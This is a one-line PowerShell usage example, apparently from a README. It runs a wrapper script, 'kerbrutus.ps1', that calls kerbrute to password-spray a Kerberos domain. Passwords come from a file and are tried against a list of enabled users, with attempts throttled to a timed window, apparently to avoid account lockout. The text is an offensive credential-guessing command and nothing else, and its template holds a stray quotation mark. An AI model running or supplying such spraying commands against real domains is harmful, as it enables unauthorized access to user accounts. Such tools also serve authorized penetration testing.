```PowerShell
.\kerbrutus.ps1 -ExecutionCount 2 -TimeWindowMinutes 1 -CommandTemplate '.\kerbrute_windows_amd64.exe passwordspray -d domain.local .\enabled_users.txt -v -o kerbrute_<pass>.txt <pass>"' -PasswordsFile passwords.txt
```
